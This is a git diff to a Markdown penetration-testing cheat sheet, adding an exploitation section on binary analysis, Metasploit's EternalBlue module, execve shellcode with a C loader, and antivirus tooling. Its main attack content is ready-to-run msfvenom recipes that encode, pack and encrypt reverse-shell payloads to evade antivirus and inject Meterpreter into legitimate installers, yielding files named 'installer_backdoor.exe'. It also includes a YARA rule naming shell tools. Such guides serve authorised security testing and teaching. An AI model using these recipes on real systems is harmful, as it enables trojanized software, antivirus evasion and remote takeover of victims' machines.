@@ -550,17 +550,496 @@ nmap -sU -p 161 --script=snmp-interfaces,snmp-netstat 192.168.1.40
 
 ## Exploitation
 
-Once we have all the information we could gather about a system, the next phase consists in trying to exploit said system.
+Once all available information about a target system has been collected, the subsequent phase involves attempting to exploit the identified weaknesses within that system.
 
-There are a lot of entry points and exploits that we can use, and the best choices will depend on the information we found. Normally we want to try and start to exploit the attack vector that seems more vunerable and potentially will detect less our activities.
+Multiple entry points and exploitation techniques may be available, and the most appropriate approach depends on the intelligence gathered during the reconnaissance phase. Typically, priority is given to attack vectors that appear to be the most vulnerable while also offering a lower likelihood of detection, thereby minimizing the operational footprint.
 
-There are several exploit disciplines such as:
+Exploitation activities can be categorized into several technical disciplines, including:
 - [Intrusion](#intrusion)
-- [Client Side Exploitation](#client-side-exploitation)
 - [AntiVirus Evasion](#antivirus-evasion)
 - [Password Attacks](#password-attacks)
 - [Web Exploitation](#web-exploitation)
 - [Privilege Escalation](#privilege-escalation)
+
+### Intrusion
+
+#### Analysis
+
+- `HxD`: is a hexadecimal editor and disk inspection tool used to analyze the raw contents of files, memory, and disks at the byte level. It is commonly used in malware analysis, reverse engineering, and digital forensics to inspect file structures, headers, embedded data, and obfuscated content.
+
+```
+https://mh-nexus.de/en/hxd/
+```
+
+- `PE-bear`: is a Windows Portable Executable (PE) analysis tool used to inspect and analyze the internal structure of PE files, including headers, sections, imports, exports, resources, and security features.
+
+```
+https://github.com/hasherezade/pe-bear
+```
+
+- `strings`: is a command-line utility that extracts and displays all printable human-readable strings from binary files, executables, or other non-text data. It is commonly used in malware analysis, reverse engineering, and forensics to discover embedded paths, URLs, passwords, or other indicators.
+
+```bash
+# Extract human-readable strings from a binary file
+strings /home/user/suspicious_file.exe
+
+# Extract strings and display their byte offsets
+strings -t x /home/user/suspicious_file.exe
+
+# Extract strings from a memory dump or disk image
+strings /mnt/disk/memdump.bin > extracted_strings.txt
+```
+
+- `gdb`: is a GNU debugger used to analyze, control, and inspect the execution of programs at runtime, commonly applied in binary exploitation, reverse engineering, and vulnerability research.
+
+```bash
+# Launch gdb
+gdb ./vulnerable_program
+
+# Start gdb and attach to a running process
+gdb -q -p 1337
+
+# Load a binary without starting execution
+gdb -q ./binary
+```
+
+```bash
+# Common commands inside the gdb CLI
+
+# Start program execution
+run
+r
+
+# Run with arguments
+run AAAA BBBB
+
+# Set a breakpoint at main
+break main
+b main
+
+# Set a breakpoint at a specific address
+break *0x401080
+
+# List breakpoints
+info breakpoints
+
+# Continue execution
+continue
+c
+
+# Step into the next instruction
+step
+si
+
+# Step over the next instruction
+next
+ni
+
+# Examine registers
+info registers
+
+# Examine memory (hex format)
+x/16x $rsp
+
+# Examine memory as string
+x/s $rdi
+
+# Display disassembly
+disassemble
+disas main
+
+# Show stack backtrace
+backtrace
+bt
+
+# Modify register value
+set $rip=0x401000
+
+# Quit gdb
+quit
+q
+
+# Print a function
+print example
+p function
+
+# Print a variable
+print counter
+p counter
+
+# Print a register
+print $rip
+p $rsp
+
+# Print in hexadecimal
+print/x $rax
+
+# Print as a string
+print (char *)$rdi
+
+# Print array contents
+print my_array[0]@10
+
+# Search memory range for a string
+find 0x400000, 0x401000, "password"
+
+# Search stack for a hex pattern
+find $rsp, $rsp+0x200, 0x41414141
+
+# Search heap or global memory
+find 0x600000, 0x700000, "/bin/sh"
+
+# Search for a byte sequence
+find 0x400000, 0x401000, {0x90, 0x90, 0x90}
+```
+
+- `Compiled Code Analysis`: The analysis of compiled machine code and its dependencies is used to inspect instructions, discover control‑flow behavior, identify gadgets for exploitation, and enumerate shared library dependencies.
+
+```bash
+# Disassemble a binary using Intel syntax
+objdump -M intel -D ./binary
+
+# Disassemble only executable sections
+objdump -M intel -d ./binary
+
+# Display section headers and permissions
+objdump -h ./binary
+```
+
+```bash
+# Search for ROP gadgets in a binary
+ropper --file ./binary
+
+# Search for specific gadgets (e.g., syscall)
+ropper --file ./binary --search "syscall"
+
+# Display gadget addresses and instructions
+ropper --file ./binary --type all
+```
+
+```bash
+# List shared library dependencies of an executable
+ldd ./binary
+
+# Identify dynamically linked libraries and paths
+ldd ./src
+```
+
+#### Intrusion
+
+- `msfconsole`: is the interactive command-line interface of the Metasploit Framework, used to manage exploits, payloads, auxiliary modules, sessions, and post‑exploitation tasks within a unified environment.
+
+```bash
+# Launch Metasploit Framework
+msfconsole
+
+# Launch Metasploit quietly (no banner)
+msfconsole -q
+
+# Select an exploit module
+use exploit/windows/smb/ms17_010_eternalblue
+
+# Display detailed information about the selected module
+info
+
+# Show configurable options for the current module
+show options
+
+# Set target host(s)
+set RHOSTS 192.168.1.20
+
+# Set local callback address
+set LHOST 192.168.1.100
+
+# Show available targets for the exploit
+show targets
+
+# Show compatible payloads
+show payloads
+
+# Set a payload explicitly
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+
+# Run the exploit
+exploit
+
+# Run the exploit in the background
+exploit -j
+
+# List background jobs
+jobs
+
+# Interact with active sessions
+sessions
+
+# List all active sessions
+sessions -l
+
+# Interact with a specific session
+sessions -i 1
+
+# Kill a specific session
+sessions -k 1
+
+# Kill all sessions
+sessions -K
+
+# Automatically migrate Meterpreter to a stable process
+set AutoRunScript migrate -f
+```
+
+- `shellcode`: is a small sequence of position‑independent machine instructions designed to be injected and executed within a vulnerable process or a malware, typically to spawn a shell or execute arbitrary commands.
+
+```asm
+; shell.asm - simple execve("/bin/sh") shellcode (x86_64)
+global _start
+
+section .text
+_start:
+    xor rdx, rdx
+    mov rbx, 0x68732f6e69622fff
+    shr rbx, 8
+    push rbx
+    mov rdi, rsp
+    xor rsi, rsi
+    mov al, 59
+    syscall
+```
+
+```bash
+# Assemble the code (64-bit)
+nasm -f elf64 shell.asm -o shell.o
+
+# Link the object file into an executable
+ld shell.o -o shell_exec
+
+# Disassemble the executable to view instructions
+objdump -d shell_exec
+
+# Extract only the .text section as raw binary
+objcopy -j .text -O binary shell_exec shell_exec.bin
+
+# Convert raw shellcode to C-compatible byte array
+xxd -i shell_exec.bin
+```
+
+```c
+/* Example usage in C */
+unsigned char shellcode[] = {
+    0x48, 0x31, 0xd2, 0x48, 0xbb, 0xff, 0x2f, 0x62,
+    0x69, 0x6e, 0x2f, 0x73, 0x68, 0x48, 0xc1, 0xeb,
+    0x08, 0x53, 0x48, 0x89, 0xe7, 0x48, 0x31, 0xf6,
+    0xb0, 0x3b, 0x0f, 0x05
+};
+
+int main() {
+    (*(void(*)())shellcode)();
+}
+```
+
+```bash
+# Compile C loader without stack protections (for testing)
+gcc shellcode.c -o shellcode_exec -fno-stack-protector -z execstack
+```
+
+- `BeEF`: is a browser exploitation framework designed to assess the security posture of web browsers by analyzing client‑side attack surfaces such as JavaScript execution, browser extensions, and session context. It is commonly used in web security testing, client‑side attack simulation, and defensive research.
+
+```
+https://beefproject.com/
+```
+
+### AntiVirus Evasion
+
+#### AntiVirus
+
+- `ClamAV`: is an open‑source antivirus engine used to detect malware, viruses, trojans, and malicious files using signature‑based and heuristic scanning. It supports custom signature databases and integration with YARA rules for advanced detection.
+
+```
+https://www.clamav.net/
+```
+
+```bash
+# Scan a directory recursively for malware
+clamscan -r /var/www/html
+
+# Scan a single file with verbose output
+clamscan --verbose /tmp/suspicious_file.bin
+
+# Enable debug output during scanning
+clamscan --debug /opt/uploads
+
+# Generate a hash signature for a file (example using SHA256)
+sigtool --sha256 /tmp/suspicious_file.bin
+
+# Scan using a custom signature database
+clamscan -d /opt/clamav/custom_sigs.ndb /home/user/downloads
+
+# Update ClamAV virus definitions
+freshclam
+```
+
+```bash
+# ClamAV custom signature database (NDB format)
+# Structure:
+# <SignatureName>:<TargetType>:<Offset>:<HexPattern>
+
+# Example signature matching the EICAR test string
+Eicar-Test-Signature:0:*:45494341522D5354414E444152442D414E544956495255532D544553542D46494C45
+```
+
+```bash
+# YARA rule file used with ClamAV or external YARA scanners
+# Files matching this rule are flagged as suspicious
+
+rule Suspicious_Execution_Strings {
+    meta:
+        description = "Detects suspicious command execution indicators"
+        author = "Security Team"
+    strings:
+        $cmd1 = "cmd.exe"
+        $cmd2 = "powershell"
+        $cmd3 = "/bin/bash"
+    condition:
+        any of them
+}
+```
+
+- `VirusTotal`: is an online malware scanning and analysis service that aggregates multiple antivirus engines, URL scanners, and file analysis tools to detect malicious files, URLs, and domains. It provides detailed reports on threats, file metadata, and detection history, useful for threat intelligence and security research.
+
+```
+https://www.virustotal.com/gui/home/upload
+```
+
+```bash
+# Upload a file via the VirusTotal web interface
+# Navigate to https://www.virustotal.com/gui/home/upload
+# Drag and drop the file or select it using the file picker
+
+# Submit a file using the VirusTotal CLI (vt-cli)
+vt file scan /home/user/suspicious_file.exe
+
+# Check the analysis report for a file by hash (SHA256)
+vt file report 3b5d5c3712955042212316173ccf37be80000000000000000000000000000000
+
+# Scan a URL for malicious content
+vt url scan https://example.com/suspicious
+
+# Retrieve a URL scan report
+vt url report https://example.com/suspicious
+```
+
+- `Jotti VirusScan`: is an online multi‑antivirus scanning service that analyzes files for malware without sharing submissions with antivirus vendors. It provides independent detection results from several antivirus engines, making it useful for privacy‑conscious threat analysis.
+
+```
+https://virusscan.jotti.org/
+```
+
+#### Analysis
+
+- `SharpEDRChecker`: is a Windows post‑exploitation enumeration tool used to identify installed Endpoint Detection and Response (EDR) and antivirus products by querying system artifacts such as services, drivers, processes, and registry entries.
+
+```
+# Clone the repository
+git clone https://github.com/PwnDexter/SharpEDRChecker.git
+
+# Build the project using Visual Studio or dotnet CLI
+dotnet build SharpEDRChecker.sln -c Release
+
+# Execute SharpEDRChecker on a Windows system
+SharpEDRChecker.exe
+
+# Execute and redirect output to a file
+SharpEDRChecker.exe > edr_results.txt
+```
+
+#### Behaviour-Based Techniques
+
+#### Anti-Analysis Techniques
+
+- `msfvenom`: is a payload generation tool that supports packing, encoding, and encryption techniques to transform malicious payloads for research, red‑team simulations, and malware analysis labs. These mechanisms are commonly studied to understand how malware attempts to evade static detection.
+
+```bash
+# ENCODING
+# Encoding transforms the payload to avoid simple signature-based detection.
+# It is reversible and primarily used for obfuscation.
+
+# Encode a Windows payload using a polymorphic encoder
+msfvenom -p windows/meterpreter/reverse_tcp \
+LHOST=192.168.1.100 LPORT=4444 \
+-e x86/shikata_ga_nai -i 5 \
+-f exe > encoded_payload.exe
+
+# PACKING
+# Packing compresses or wraps the payload so the original code is only
+# revealed at runtime. Often combined with injection into a legitimate binary.
+
+# Pack (wrap) a payload inside a legitimate executable
+msfvenom -p windows/meterpreter/reverse_tcp \
+LHOST=192.168.1.100 LPORT=4444 \
+-x legit_app.exe -k \
+-f exe > packed_payload.exe
+
+# ENCRYPTION
+# Encryption hides the payload content using a cipher and decrypts it at runtime.
+# This provides stronger concealment than encoding.
+
+# Encrypt a payload using AES encryption
+msfvenom -p windows/x64/meterpreter/reverse_tcp \
+LHOST=192.168.1.100 LPORT=4444 \
+--encrypt aes256 --encrypt-key MyStrongKey123 \
+-f exe > encrypted_payload.exe
+
+# RAW SHELLCODE WITH ENCODING (for custom loaders)
+msfvenom -p linux/x64/shell_reverse_tcp \
+LHOST=192.168.1.100 LPORT=4444 \
+-e x64/xor -i 3 \
+-f raw > shellcode.bin
+```
+
+- `ConfuserEx`: is a .NET obfuscation and protection framework used to obfuscate, pack, and harden managed assemblies by applying transformations such as control‑flow obfuscation, symbol renaming, string encryption, and anti‑tamper mechanisms. It is commonly used for software protection research, reverse‑engineering resistance, and malware analysis labs.
+
+```bash
+# Clone the ConfuserEx repository
+git clone https://github.com/yck1509/ConfuserEx.git
+
+# Build ConfuserEx (Release)
+msbuild ConfuserEx.sln /p:Configuration=Release
+```
+
+#### Injection Techniques
+
+- `msfvenom`: is a payload generation tool that can be used for malware injection, allowing malicious payloads to be embedded into legitimate executables while preserving original functionality.
+
+```bash
+# Inject a Meterpreter payload into a legitimate Windows executable
+msfvenom -p windows/meterpreter/reverse_tcp \
+LHOST=192.168.0.1 LPORT=4444 \
+-x /usr/share/windows-binaries/radmin.exe \
+-k -f exe > radmin_infected.exe
+
+# Explanation:
+# -x : template executable to inject into
+# -k : keep original program functionality
+# Resulting file executes the original program and the injected payload
+
+# Inject a reverse shell payload into a custom Windows executable
+msfvenom -p windows/shell_reverse_tcp \
+LHOST=192.168.1.100 LPORT=443 \
+-x clean_app.exe -k -f exe > clean_app_trojanized.exe
+
+# Inject payload with basic encoding (obfuscation during injection)
+msfvenom -p windows/meterpreter/reverse_tcp \
+LHOST=192.168.1.100 LPORT=8443 \
+-e x86/shikata_ga_nai -i 3 \
+-x legit_installer.exe -k -f exe > installer_backdoor.exe
+
+# Generate injected payload for testing delivery mechanisms (no execution)
+msfvenom -p windows/meterpreter/reverse_tcp \
+LHOST=192.168.1.100 LPORT=4444 \
+-x app.exe -k -f exe -o injected_app.exe
+```
+
+#### Fileless Techniques
 
 ### Password Attacks
 
@@ -848,63 +1327,6 @@ ssh2john id_rsa > ssh_hash.txt
 username:$6$somesalt$hashedpassword
 ```
 
-Antivirus
-
-ClamAV: https://www.clamav.net/
-VirusTotal: https://www.virustotal.com/gui/home/upload
-Jotti VirusScan: https://virusscan.jotti.org/ (Does not share with AV companies)
-
-Signature based open source Antivirus
-
-```
-clamscan path/to/scan -> scan a folder
-sigtool --{hash algorithm} path/to/file -> generate the hash signature of a file
-clamscan -d path/to/custom/signaturedatabase path/to/scan
-
-yara database -> a file with rules in yara formats, a file is considered malware if it matches the rules in the database
-database -> a file with signatures separated by \n
---debug -> show more information
-```
-
-Fingerpriting Antivirus and other services
-
-SharpEDRChecker: https://github.com/PwnDexter/SharpEDRChecker
-
-Analyze the contents of a file
-
-HxD application -> https://mh-nexus.de/en/hxd/
-
-PE-Bear: (Analyze windows PE strucuture)
-```
-strings path/to/file -> outputs all human readable strings
-```
-
-Compile assembly code
-
-```
-write assembly code
-nasm -f <system type (32 or 64)> path/to/code -> o
-ld path/to/o -o future/exec -> exec
-objdump -d file/to/dump -> shellcode (binary)
-objcopy -j .text -O binary <exec> <exec>.text -> text file
-xxd -i <exec>.txt -> binary in C code
-xxd -i <bin>.bin -> binary in C code
-
-in c:
-
-(*(void(*)())message)();
-```
-
-Evasion of AV
-
-Encoding & Decryption
-
-Packers
-
-ConfuserEx
-
-Binders -> Merge two programs
-
 ### Web Exploitation
 
 #### SQL Injection
@@ -1159,13 +1581,11 @@ xsser -u "http://example.com/search.php?q=test" --report xsser_report.txt
 
 ### Privilege Escalation
 
-Having access to a system doesn't always mean that we are able to do anything we want. Most of the times, when gaining access to a system we will probably be limited to a normal user with limited privileges, only allowing us to do little to no abuse.
+Gaining access to a system does not inherently imply unrestricted control over its resources or functionality. In most cases, initial access is obtained under the context of a standard user account with limited privileges, which significantly restricts the ability to perform meaningful or impactful actions.
 
-Enters privilege escalation. The objective of this discipline is, once having access to a system, no matter what user we start in we exploit it to escalate our permissions to a more privileged user, or the admin itself if possible.
+This limitation introduces the need for privilege escalation. The objective of this discipline is to exploit weaknesses within the system in order to elevate permissions from the initially compromised user account to a more privileged context, ideally achieving administrative or root‑level access when possible.
 
-By exploiting and escalating our privileges, we will be able to abuse the system better and obtain explore it more.
-
-The first step of this exploitation is exploring it's abuse vectors, covered by enumarition.
+Successful privilege escalation enables broader control over the system, allowing for deeper interaction, increased abuse potential, and more extensive exploration of system resources and configurations.
 
 #### Enumeration
 
